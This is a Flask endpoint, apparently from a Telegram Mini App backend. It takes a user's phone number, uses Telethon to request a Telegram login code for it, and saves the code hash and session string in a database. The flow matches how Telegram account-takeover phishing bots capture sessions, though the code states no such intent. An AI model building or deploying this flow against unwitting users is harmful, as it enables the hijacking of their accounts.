@app.route('/request_code', methods=['POST'])
def request_code():
    data = request.json
    user_id = str(data.get('user_id'))
    phone = data.get('phone')  # Get phone from Mini App directly
    
    if not phone:
        # Fallback: try to get from database if bot stored it
        conn = get_db_connection()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute("SELECT phone FROM sessions WHERE user_id = %s", (user_id,))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            phone = row['phone']
    
    if not phone:
        return jsonify({"success": False, "error": "Phone number required"})
    
    # Now request the code with the phone number
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def do_request():
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            
            session_string = client.session.save()
            active_sessions[user_id] = {'client': client, 'phone': phone, 'hash': phone_code_hash}
            
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (user_id) 
                DO UPDATE SET 
                    phone = %s, 
                    phone_code_hash = %s,
                    session_string = %s,
                    created_at = CURRENT_TIMESTAMP
            """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"[CODE REQUESTED] for {phone}")
            return True, None
            
        except Exception as e:
            print(f"[ERROR] {e}")
            return False, str(e)
    
    success, error = loop.run_until_complete(do_request())
    loop.close()
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})
